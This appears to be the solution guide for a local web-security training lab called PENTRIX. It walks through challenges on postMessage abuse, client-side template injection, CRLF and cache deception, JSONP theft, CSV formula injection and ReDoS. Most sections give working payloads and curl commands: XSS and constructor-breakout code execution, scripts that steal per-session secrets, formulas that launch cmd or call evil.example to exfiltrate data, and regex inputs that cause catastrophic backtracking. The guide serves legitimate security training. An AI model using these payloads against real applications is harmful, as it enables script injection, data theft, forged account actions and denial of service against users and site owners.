**Burp workflow:** Open /postmsg/wildcard/attacker with the Proxy on. The victim widget posts { token: SECRET_TOKEN } to the parent with targetOrigin '*', the attacker listener grabs e.data.token, and you will see it beacon /postmsg/beacon?v=wildcard with the captured secret inside the d parameter. Send that beacon to Repeater and swap the token for a wrong value: the award is rejected, which teaches you the claim only fires with the session's real secret. The leak is client side, so use Proxy to watch exactly what value the attacker exfiltrated and confirm it was the real one.


**3. Unsanitized Message Data Rendered as HTML** – `PENTRIX{...}`

1. Open `/postmsg/data-xss/attacker` in the browser.
2. Click "Fire payload". The attacker page posts an object, not a string:
   ```
   document.getElementById('v').contentWindow.postMessage(
     { html: '<img src=x onerror="alert(\'postMessage XSS\')">' }, '*');
   ```
3. The victim takes `e.data.html` and drops it into `innerHTML` unsanitized,
   then beacons `v=data-xss`.
Why it works: message data is rendered as raw HTML with no sanitization, so an
object-shaped message becomes live markup in the victim page.

**Burp workflow:** Click "Fire payload" on /postmsg/data-xss/attacker with Intercept on. The victim takes e.data.html, drops it into innerHTML unsanitized, then beacons /postmsg/beacon?v=data-xss with a slice of the rendered HTML in d. Forward the beacon to Repeater (Ctrl+R) and vary the d parameter to see what the award endpoint expects and how much of the HTML it keeps. Like challenge 1, the object-shaped message never leaves the browser, so Burp's value is inspecting the beacon that proves your markup became live page content.


**4. Substring Origin Check Bypass** – `PENTRIX{...}`

1. Open `/postmsg/substring/attacker`. The victim checks
   `originToTest.includes('pentrix.lab')`, so an attacker domain containing that
   string passes: `'https://pentrix.lab.evil.com'.includes('pentrix.lab')` is
   true.
2. The lab simulates the attacker origin (`?simulateOrigin=https://pentrix.lab.evil.com`,
   shown in a banner, since a local lab cannot mint DNS origins) and the
   vulnerable `includes()` check itself is the real code under test.
3. Click "Fire payload". The check passes, the HTML is rendered, and the victim
   beacons `v=substring`.
Why it works: a substring match instead of an exact comparison lets
`https://pentrix.lab.evil.com` ride on the trusted string `pentrix.lab`.

**Burp workflow:** Before firing, open /postmsg/substring/attacker?simulateOrigin=https://pentrix.lab.evil.com in the Proxy and read the inline victim-page script. Confirm the check is originToTest.includes('pentrix.lab'), which is the whole bug: an attacker domain containing that string passes. Now fire the payload and watch /postmsg/beacon?v=substring arrive in the Proxy. To drill the bypass logic in Repeater, request GET /postmsg/substring?simulateOrigin= with different values (for example a domain that only starts with the string versus one that contains it in the middle) and see which ones the banner echoes, then confirm only containing origins would pass the real check.


**5. Privileged Action via Forged Message** – `PENTRIX{...}`

1. Open `/postmsg/csrf-action/attacker` in the browser. It embeds the victim's
   account settings page.
2. Click "Fire payload". The attacker page posts:
   ```
   document.getElementById('v').contentWindow.postMessage({ action: 'delete-account' }, '*');
   ```
3. The victim handler fires `POST /postmsg/csrf-action/delete` with no origin
   check and no confirmation, deletes the account, and beacons
   `v=csrf-action&d=csrf-action:account-deleted`. The beacon only awards if the
   deletion really happened (verified: pre-deletion beacon is rejected).
   Reset the lab account via `/postmsg/csrf-action/reset`.
Why it works: a state-changing action is driven by any cross-origin message
with no origin verification and no user confirmation, which is CSRF delivered
through postMessage.

**Burp workflow:** With Intercept on, click "Fire payload" on /postmsg/csrf-action/attacker. The victim handler fires POST /postmsg/csrf-action/delete with no origin check and no confirmation, deletes the PenMail account, then beacons v=csrf-action&d=csrf-action:account-deleted. Send the POST to Repeater (Ctrl+R) and replay it to confirm the deletion works with no origin header and no user token at all. Reset the lab account any time with GET /postmsg/csrf-action/reset, which you can fire straight from Repeater when you want to run the drill again.


---
---


## csti – Client-Side Template Injection

**1. Basic Template Evaluation** – `PENTRIX{...}`

1. Open `/csti/basic` and save a greeting containing an expression, e.g.
   `Hello {{7*7}}!`.
2. The preview renders `Hello 49!`. The page's JavaScript sees `49` in the
   rendered output and beacons `v=basic&d=49`, awarding the flag.
Why it works: `{{ expression }}` is compiled with `Function` and executed, so
any arithmetic (or JavaScript) inside the delimiters evaluates in the victim's
browser.

**Burp workflow:** Browse `/csti/basic` through the Proxy and save a greeting with the form so you can see the POST to `/csti/basic` with the `tpl` field in the Proxy history. Send that POST to Repeater (Ctrl+R) and set `tpl` to an arithmetic expression inside the template delimiters, then fire it and render the preview in the browser. Check the Proxy history for the beacon GET to `/csti/beacon?v=basic` that the page fires when the evaluated result shows up in the preview.


**2. Filter Bypass via Alternative Delimiter** – `PENTRIX{...}`

1. Open `/csti/filter-bypass`. Submitting `{{7*7}}` is rejected with
   "Blocked by the filter" (the server refuses any template containing `{{`
   or `}}`; verified with curl: HTTP 400).
2. The client engine also evaluates a second delimiter syntax the filter never
   heard of. Save `[[7*7]]` instead: it is accepted (HTTP 302) and the preview
   renders `49`, which beacons `v=filter-bypass`.
Why it works: the blacklist is server-side and only knows `{{ }}`, while the
client-side engine evaluates `[[ ]]` too, so the filter and the engine disagree
about what is a template.

**Burp workflow:** In the Proxy, save the form on `/csti/filter-bypass` with a plain template expression and watch it get rejected with HTTP 400 on POST `/csti/filter-bypass`. Send the rejected POST to Repeater (Ctrl+R) and swap the `tpl` field to the alternate delimiter syntax the engine also evaluates, which the server filter does not check. Fire it, let the browser render the preview, and confirm the `/csti/beacon?v=filter-bypass` GET appears in Proxy history.


**3. Constructor Breakout to Code Execution** – `PENTRIX{...}`

1. Open `/csti/constructor`. Every expression can see `constructor` (which is
   `Object`), and `Object.constructor` is `Function`, so a template can compile
   and run arbitrary code.
2. Save this template:
   ```
   {{constructor.constructor("fetch('/csti/beacon?v=constructor&d=ctor:'+cstiDjb2(CSTI_NONCE)+'&n='+CSTI_NONCE)")()}}
   ```
3. When the preview renders, the expression compiles the string with `Function`
   and runs it; the fetch hits the beacon and awards the flag. The beacon is
   strict: `n` must echo the page-bound token (`CSTI_NONCE`, computed at
   runtime by the page script and never present in the page source), and `d`
   must be `ctor:` followed by `cstiDjb2(CSTI_NONCE)`, the page's own hash of
   that token. An arbitrary `d` value (a word like `code-executed`, a cookie, a
   guess) is rejected, and a bare beacon call with no page load earns nothing.
**4. CSTI Inside an HTML Attribute** – `PENTRIX{...}`

1. Open `/csti/attr` and save `{{7*7}}` as the badge text. View source: the
   server entity-encodes it into the `value` attribute.
2. The page's JavaScript reads the attribute back with `getAttribute('value')`
   (which decodes the entities), runs the raw template through `cstiRender`,
   and the badge shows `49`, which beacons `v=attr`.
Why it works: server-side entity encoding only changes how the bytes look in
HTML source; `getAttribute` decodes them back, and encoding never stopped the
client-side engine from evaluating the template.

**Burp workflow:** Browse `/csti/attr` through the Proxy, save the form with a template as the badge text, and capture the POST to `/csti/attr`. Right-click the response or page load in history, look at the rendered HTML, and note that your `tpl` value lands entity-encoded inside the `value` attribute. That encoding does not matter here, so send the POST to Repeater (Ctrl+R), tweak the `tpl` expression if you like, and reload the page in the browser to let the JavaScript decode the attribute and evaluate it. The flag comes when the badge shows the evaluated result and the page fires `/csti/beacon?v=attr`, so keep an eye on Proxy history.


**5. Stored Template in Profile Name** – `PENTRIX{...}`

1. Open `/csti/stored` and save `{{7*7}}` as a display name. It is stored in the
   database (`csti_profiles`) and rendered on every view.
2. Reload the member list: every visitor's browser evaluates the stored name
   as a template and the list shows `49`. That alone does not award the flag:
   this challenge is victim-bound, so a beacon fired with your own session
   token is rejected.
3. Load `/csti/stored/victim-visit`: a simulated victim views the directory in
   a fresh victim session, your stored template evaluates there, and the flag
   is awarded on that page.
Why it works: stored display names are evaluated as templates on every view, so
the injection persists and fires for every visitor, not just the attacker.

**Burp workflow:** Proxy through `/csti/stored`, fill in the display name form, and intercept the POST to `/csti/stored/profile` to confirm the `name` field carries your template. Send it to Repeater (Ctrl+R) if you want to test variations without retyping, then reload the member list in the browser. The stored name is evaluated as a template on every view, so the beacon GET to `/csti/beacon?v=stored` fires from the page load itself, which you will see in Proxy history. Then load `/csti/stored/victim-visit` in the browser: the simulated victim's fresh session is what claims the flag, since a beacon carrying your own session token is rejected.

---


## http – HTTP Layer Flaws

**1. CRLF Log Injection** – `PENTRIX{...}`

1. Inject CR/LF bytes via the tracked ref parameter:
   `curl "http://<your-lab-address>/http/track?ref=homepage%0d%0a2026-10-02T00:00:00.000Z%20FAKE%20admin%20login%20from%2010.9.9.9"`
   The response page shows the flag.
2. Open `http://<your-lab-address>/http/admin/log` and confirm the forged
   `FAKE admin login` line appears as its own log entry.

Why it works: the raw ref value, CR/LF bytes included, is written to the
access log with no sanitization, so `%0d%0a` splits one entry into two, and
the log viewer renders the injected HTML raw.

**Burp workflow:** Browse to /http/track?ref=homepage through the Burp Proxy so you can see the exact request. Send it to Repeater (Ctrl+R), then URL-encode your CR/LF bytes right inside the ref parameter (%0d%0a) followed by your forged text. Render the response in the browser view to confirm the flag, then request /http/admin/log in Repeater and check that your injected line shows up as its own log entry.


**2. Verb Tampering** – `PENTRIX{...}`

1. The feedback form posts to `/http/feedback` and the page says POST-only.
2. Submit the same action as GET:
   `curl "http://<your-lab-address>/http/feedback?msg=hello"`
   The feedback is recorded and the flag is shown.

Why it works: the same handler is registered for both GET and POST, so the
"POST-only" endpoint performs its state change over GET too (bookmarkable,
loggable, CSRF-able).

**Burp workflow:** Submit the feedback form once through the Proxy so Burp captures the POST to /http/feedback with the msg field. Send it to Repeater (Ctrl+R), then switch the request line to GET and move msg into the query string as /http/feedback?msg=... . Send it and you will see the "POST-only" endpoint happily records your feedback and hands you the flag.


**3. Cache Deception** – `PENTRIX{...}`

1. Purge the demo cache: open `http://<your-lab-address>/http/cache-purge`.
2. As the victim: open `http://<your-lab-address>/http/cache-login?user=alice`,
   then open `http://<your-lab-address>/http/account.css`. The response header
   says `X-Cache: MISS` and the CDN caches alice's personalized stylesheet.
3. As the attacker (fresh session: private window, or curl without the
   victim's cookie): `curl -i http://<your-lab-address>/http/account.css`
   You get `X-Cache: HIT`, the body still contains
   `ALICE-CDN-SECRET-9d2f`, and the `X-Flag` header carries the flag.

Why it works: the naive cache is keyed on the URL path only, so the victim's
personalized response (sent with `Cache-Control: public, max-age=3600`) is
served to every later visitor.

**Burp workflow:** First clear the demo cache by requesting /http/cache-purge. Then play the victim in one browser window routed through the Proxy: open /http/cache-login?user=alice and then /http/account.css, and check the response headers in the Proxy history for X-Cache: MISS. Now play the attacker in a separate cookie-less Repeater tab and request /http/account.css again: you should see X-Cache: HIT and someone else's secret in the body. The flag is not in the body, so read the X-Flag response header in Repeater.


## jsonp – JSONP Injection

**1. Callback XSS** – `PENTRIX{...}`

1. Probe the breakout: `curl -i "http://<your-lab-address>/jsonp/user?callback=alert(1)//"`
   The body is `alert(1)//({"user":"alice","role":"user","pxa":"...","pxk":"..."});` served as
   `application/javascript`. That proves execution, but earns no flag on its own: there is no
   `X-Flag` header on this response anymore.
2. Claim the flag with a payload that beacons the per-session token. The response data carries
   the token only as two share fields, `pxa` and `pxk`; your code must combine them at runtime
   (XOR the hex pairs) and echo the rebuilt token to `/jsonp/beacon-xss`. Define a small
   `combineHex(a,b)` helper on a page you control (it XORs the two hex strings pair by pair),
   then load the feed as a script from that page:
   ```
   <script src="/jsonp/user?callback=(d=>fetch('/jsonp/beacon-xss?v=callback-xss&n='+combineHex(d.pxa,d.pxk)))//"></script>
   ```
   The parenthesized arrow function is called with the data object, reads the shares, and fires
   the beacon; the beacon response carries the flag.

Why it works: the callback name is reflected into executable JavaScript with
no validation, so it breaks out of the function-call context. Only a beacon
carrying the rebuilt token counts, because it proves the injected script
really executed with the response data.

**Burp workflow:** With your browser proxied through Burp, browse to /jsonp/user?callback=hello and watch the request land in Proxy history. Right click it and send it to Repeater (Ctrl+R). In Repeater, change the callback parameter value to break out of the function call wrapper, then confirm the response body reflects your tampering and is served as application/javascript. Load the tampered URL as a script on a page you control (with the `combineHex` helper defined) so the injected script runs, combines the `pxa`/`pxk` shares from the data, and beacons the rebuilt token to /jsonp/beacon-xss?v=callback-xss: the beacon response shows the flag.


**2. JSONP Data Theft** – `PENTRIX{...}`

1. While "logged in", visit `http://<your-lab-address>/jsonp/attacker` in the
   browser. The page's `<script src="/jsonp/data?callback=steal">` pulls the
   victim's JSONP feed (classic script tags ignore the Same-Origin Policy),
   then POSTs the data to `/jsonp/beacon`, which replies with the flag.
2. Manual equivalent (keep one cookie jar throughout: the secret is
   per-session and the beacon is rejected unless it matches the secret this
   session's feed served):
   ```bash
   curl -s -b jar -c jar "http://<your-lab-address>/jsonp/data?callback=steal" -o /tmp/feed.txt
   SECRET=$(grep -o '"secret":"[^"]*"' /tmp/feed.txt | cut -d'"' -f4)
   curl -s -b jar -X POST -H "Content-Type: application/json" \
     --data "{\"user\":\"alice\",\"secret\":\"$SECRET\"}" \
     http://<your-lab-address>/jsonp/beacon
   ```
   The secret rotates after a valid beacon, so read a fresh one per run.

Why it works: sensitive data served as JSONP is readable cross-origin by any
site that can get the victim to load a script tag.

**Burp workflow:** Proxy your browser through Burp and open /jsonp/attacker. In Proxy history you will see a plain script tag request to /jsonp/data?callback=steal, no CORS checks, carrying the victim's data including the per-session secret. Find the POST to /jsonp/beacon that the page fires with the stolen secret, right click it and send it to Repeater (Ctrl+R), then replay it. The beacon response carries the flag, so replaying captured beacons in Repeater is a clean way to re-check the steal flow.


**3. Callback Filter Bypass** – `PENTRIX{...}`

1. `callback=alert(1)` is rejected with 400 (the word "alert" is blocked).
2. Rebuild what you need at runtime and beacon the token in the same payload. The
   response data carries the per-session token only as `pxa`/`pxk` shares, so (with the
   same `combineHex(a,b)` helper defined on your page, XORing the hex pairs) load:
   ```
   <script src="/jsonp/filtered?callback=(d=>top['fe'+'tch']('/jsonp/beacon-xss?v=filter-bypass&n='+combineHex(d.pxa,d.pxk)))//"></script>
   ```
   URL-encoded in a raw request, the callback decodes to
   `(d=>top['fe'+'tch']('/jsonp/beacon-xss?v=filter-bypass&n='+combineHex(d.pxa,d.pxk)))//`.
   The concatenation rebuilds `fetch` at runtime (the same trick rebuilds `alert`),
   the arrow function receives the data object, and the beacon fires with the rebuilt
   token. The beacon response carries the flag; the filtered feed response itself
   carries no flag header.

Why it works: the blocklist only bans the literal word "alert", but string
concatenation rebuilds banned words at runtime where the filter never looks.
The attempt shape is recorded when the callback is accepted, but only an
executed beacon echoing the rebuilt token earns the flag.

**Burp workflow:** With Proxy running, browse to /jsonp/filtered?callback=test and send the request to Repeater (Ctrl+R) to confirm the feed reflects the callback. Probe the blocklist: change callback to the banned word and watch Repeater return a 400, which tells you exactly which filter you are facing. Rebuild the banned word at runtime with string concatenation in Repeater until the 200 comes back, then load the winning URL as a script on a page you control (with `combineHex` defined) so the payload executes and beacons the rebuilt token to /jsonp/beacon-xss?v=filter-bypass: the beacon response shows the flag.


**4. Array Constructor Hijack** – `PENTRIX{...}`

1. Visit `http://<your-lab-address>/jsonp/array-attacker` in the browser. The
   page saves the real `Array`, overrides the global constructor, loads
   `/jsonp/legacy?callback=gotFriends`, captures the elements, and beacons
   them to `/jsonp/array-beacon`, which replies with the flag.
2. Manual equivalent (keep one cookie jar throughout: the feed appends a
   per-session token and the beacon is rejected with 400 unless the token
   comes back):
   ```bash
   curl -s -b jar -c jar "http://<your-lab-address>/jsonp/legacy?callback=gotFriends" -o /tmp/feed.txt
   TOKEN=$(grep -o 'feed-token:[^"]*' /tmp/feed.txt)
   curl -s -b jar -X POST -H "Content-Type: application/json" \
     --data "{\"items\":[\"alice:A1\",\"bob:B2\",\"carol:C3\",\"$TOKEN\"]}" \
     http://<your-lab-address>/jsonp/array-beacon
   ```
   The token rotates after a valid beacon, so read a fresh one for each run.

Why it works: the legacy endpoint builds its JSONP with `new Array(...)`,
so a page that overrides the global `Array` constructor before loading the
feed intercepts every element (the classic 2007 hijack), including the `feed-token:<token>` element the feed appends for this session.

**Burp workflow:** Proxy your browser through Burp and visit /jsonp/array-attacker. In Proxy history watch the sequence: the page loads /jsonp/legacy?callback=gotFriends after overriding the global Array constructor, then POSTs the captured elements to /jsonp/array-beacon. Right click that beacon POST, send it to Repeater (Ctrl+R), and replay it: a valid beacon body returns the flag in the response. This one is mostly a Proxy-history reading exercise, Repeater lets you re-fire the beacon without reloading the page.


**5. JSONP MIME Sniffing** – `PENTRIX{...}`

1. Probe: `curl -i "http://<your-lab-address>/jsonp/snippet?callback=%3Cscript%3Ealert(1)%3C%2Fscript%3E"`
   The response is `Content-Type: text/html` with
   `<script>alert(1)</script>({"note":"hello","pxa":"...","pxk":"..."});` in the body.
   The `<` in the callback records the attempt, but earns no flag by itself, and
   there is no `X-Flag` header on this response.
2. Claim the flag: your injected markup must read the `pxa` and `pxk` share
   fields out of the response text, combine them at runtime (XOR the hex
   pairs) and beacon the rebuilt token to
   `/jsonp/beacon-xss?v=mimetype&n=<token>`. The beacon response carries the
   flag, and it only accepts the beacon after the HTML-shaped attempt above
   was recorded in the same session.

Why it works: JSONP served as `text/html` is parsed as a document, so HTML in
the callback executes when the URL is visited directly or framed, and only an
executed payload that echoes the token proves it.

**Burp workflow:** Proxy your browser and open /jsonp/snippet?callback=hello, then inspect the response in Proxy history: note the Content-Type is text/html, so the browser parses it as a document, not as a script. Send the request to Repeater (Ctrl+R) and try HTML-shaped callback values, checking that the response body places your markup before the JSON. Paste the Repeater-crafted URL into Burp's browser so the injected markup executes, have it read the `pxa`/`pxk` shares from the response text, combine them, and beacon the rebuilt token to /jsonp/beacon-xss?v=mimetype: the beacon response shows the flag.


## formula – CSV Formula Injection

**1. Classic Formula Injection** – `PENTRIX{...}`

`curl -X POST --data-urlencode "name==cmd|'/c calc'!A0" --data-urlencode "note=classic" http://<your-lab-address>/formula/add`
then `curl -i http://<your-lab-address>/formula/export.csv` shows the raw
`=cmd|'/c calc'!A0` cell and `X-Flags: PENTRIX{...}`.

Why it works: cells are CSV-quoted but never neutralized, so a leading `=`
reaches the spreadsheet as a live formula.

**Burp workflow:** Open the contact form in Burp's browser and submit a normal entry with the Proxy on, so you capture the POST to /formula/add with its name and note fields. Send that request to Repeater (Ctrl+R), change the name value so it starts with the classic spreadsheet formula trigger character, and fire the request. Then send a GET to /formula/export.csv to Repeater and check the response body for your raw cell and the X-Flags header. Quoting alone does not neutralize the formula, which is what you are proving.


**2. DDE Command Execution** – `PENTRIX{...}`

`curl -X POST --data-urlencode 'name==DDE("cmd";"/c calc";"!A0")' http://<your-lab-address>/formula/add`
then export. Awards `PENTRIX{...}`.

Why it works: the `=DDE(...)` function form survives quoting and asks an
external application to run the command when the sheet opens.

**Burp workflow:** Intercept the POST to /formula/add in the Proxy and send it to Repeater (Ctrl+R). Replace the name parameter with a cell beginning with the DDE function form that asks an external application to run a command, keeping the note field harmless, then send. Repeat the download step: GET /formula/export.csv in Repeater and inspect the X-Flags header for the award. If you want to try several DDE argument shapes quickly, send the request to Intruder (Ctrl+I) instead, set name as the payload position, and iterate over your list.


**3. HYPERLINK Exfiltration** – `PENTRIX{...}`

`curl -X POST --data-urlencode 'name==HYPERLINK("http://evil.example","click me")' http://<your-lab-address>/formula/add`
then export. Awards `PENTRIX{...}`.

Why it works: `HYPERLINK` renders an attacker URL behind an innocent label
and can be combined with cell references to leak neighboring data.

**Burp workflow:** Capture the POST to /formula/add in the Proxy and push it to Repeater (Ctrl+R). Swap the name value for a cell that opens with the HYPERLINK function pointing at an external URL behind an innocent label, then fire it. Download /formula/export.csv in Repeater and confirm the X-Flags header plus the quoted cell in the body. To experiment, try folding a neighbor cell reference into the URL parameter of the HYPERLINK call, since that is how this one exfiltrates adjacent data.


**4. Pipe Prefix (LibreOffice)** – `PENTRIX{...}`

`curl -X POST --data-urlencode 'name=|/usr/bin/xcalc' http://<your-lab-address>/formula/add`
then export. Awards `PENTRIX{...}`.

Why it works: the pipe-prefixed cell is LibreOffice's formula trigger
variant, and it reaches the export unsanitized like the rest.

**Burp workflow:** Intercept the POST to /formula/add in the Proxy and send it to Repeater (Ctrl+R). Set the name value to a pipe-prefixed cell (the LibreOffice formula trigger variant) referencing a local executable, then send the request. Follow up with a GET to /formula/export.csv in Repeater and check the X-Flags header for the flag. This one is worth an Intruder run (Ctrl+I) if you want to sweep several pipe-prefixed trigger shapes against the name field to see which ones the export lets through.

---


## redos – ReDoS

**1. Catastrophic Email Regex** – `PENTRIX{...}`

`time curl "http://<your-lab-address>/redos/email?email=$(python3 -c "print('a'*30+'!'")"`
(30 a's followed by `!`, no `@` anywhere). Expect tens of seconds on a busy
machine; the flag is shown on the result page once the delay crosses the
threshold.

Why it works: the nested quantifier `((...+)+)` in the local part tries every
way to partition the 30-character run before failing on the missing `@`.

**Burp workflow:** In Proxy, capture a GET to /redos/email with an email parameter, then send it to Repeater with Ctrl+R. In Repeater, change the email value to a long run of a's followed by an exclamation mark (no @ anywhere) and watch the response time Repeater reports climbing into seconds. Nudge the length of the a-run up one send at a time until the delay is clear, then claim the flag from the result page.


**2. Nested Quantifier Username** – `PENTRIX{...}`

`time curl "http://<your-lab-address>/redos/username?username=$(python3 -c "print('a'*27+'!'")"`
(27 a's followed by `!`). Takes several seconds; the flag is shown.

Why it works: the textbook catastrophic pattern `^(a+)+$` backtracks over
every partition of the a-run before the trailing `!` fails the match.

**Burp workflow:** Intercept the GET to /redos/username in Proxy and push it to Repeater with Ctrl+R. Set the username value to a long run of a's ending in an exclamation mark, since the pattern ^(a+)+$ needs the trailing character to fail every possible partition of the run. Ramp the length of the a-run gradually in Repeater and watch the response time explode before the flag appears.


**3. Catastrophic URL Regex** – `PENTRIX{...}`

`time curl --get --data-urlencode "url=$(python3 -c "print('http://example.com/'+'a/'*12+'!'")"` http://<your-lab-address>/redos/url`
Takes several seconds; the flag is shown.

Why it works: the nested quantifiers `([\/\w .-]*)*` in the path group
explode when a long repeated path ends with a character the pattern rejects.

**Burp workflow:** Capture the GET to /redos/url in Proxy (the url parameter is URL-encoded) and send it to Repeater with Ctrl+R. Build the url value as http://example.com/ plus a repeated a/ segment and finish it with an exclamation mark so the path group can never match. Add more a/ repetitions between sends and watch Repeater's response time balloon until the flag shows on the result page.


**4. Regex Injection Search** – `PENTRIX{...}`

`time curl "http://<your-lab-address>/redos/search?q=a"`
The query is compiled to `^((a)+)+$` and tested against a fixed haystack of
26 a's plus `!`. Takes several seconds; the flag is shown.

Why it works: the search query is interpolated as the repeated atom of the
template's nested quantifiers, so matching the haystack's character gives the
backtracking engine an exponential number of partitions to try.

**Burp workflow:** Intercept the POST to /redos/search in Proxy and push it to Repeater with Ctrl+R. Your q value is compiled into the repeated atom of the server's nested-quantifier template, so set q to the same character the fixed haystack is made of (plain a) and the engine has to try every partition before the haystack's final character fails the match. Each Repeater send reports its response time, and when it crosses the one-second mark the flag is shown.

